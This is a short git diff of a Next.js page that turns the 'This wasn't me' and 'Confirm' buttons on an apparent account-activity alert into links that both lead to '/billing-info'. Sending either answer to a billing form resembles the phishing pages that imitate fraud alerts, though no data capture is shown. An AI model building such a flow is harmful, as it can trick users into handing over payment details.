@@ -1,5 +1,6 @@
 import Footer from "@/components/layout/Footer";
 import Header from "@/components/layout/Header";
+import Link from "next/link";
 import React from "react";
 
 export const metadata = {
@@ -24,12 +25,19 @@ const Page = () => {
           </p>
 
           <div className="flex gap-4 mb-6">
-            <button className="flex-1 border border-[#0d2d62] text-[#0d2d62] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors">
+            <Link
+              href={"/billing-info"}
+              className="flex-1 border border-[#056dae] text-[#056dae] py-3 rounded-lg font-semibold hover:bg-[#f0f4f9] transition-colors text-center cursor-pointer"
+            >
               This wasn’t me
-            </button>
-            <button className="flex-1 bg-[#0d2d62] text-white py-3 rounded-lg font-semibold hover:bg-[#08325a] transition-colors">
+            </Link>
+
+            <Link
+              href={"/billing-info"}
+              className="flex-1 bg-primary hover:!bg-[#054e7b] text-white py-3 rounded-lg font-semibold  transition-colors text-center"
+            >
               Confirm
-            </button>
+            </Link>
           </div>
 
           <p className="text-xs text-gray-600 leading-relaxed">
